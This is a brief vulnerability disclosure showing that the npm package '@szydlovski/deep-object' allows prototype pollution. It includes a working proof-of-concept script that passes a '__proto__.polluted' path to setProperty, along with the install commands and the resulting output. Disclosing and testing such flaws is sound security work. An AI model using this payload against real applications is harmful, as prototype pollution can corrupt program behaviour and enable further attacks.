# Description

`@szydlovski/deep-object` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var deepObject = require("@szydlovski/deep-object")
var obj = {}
console.log("Before : " + obj.polluted);
deepObject.setProperty(obj, '__proto__.polluted', 'Yes! Its Polluted');
console.log("After : " + obj.polluted);
```


2. Execute the following commands in terminal:

```
npm i @szydlovski/deep-object # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
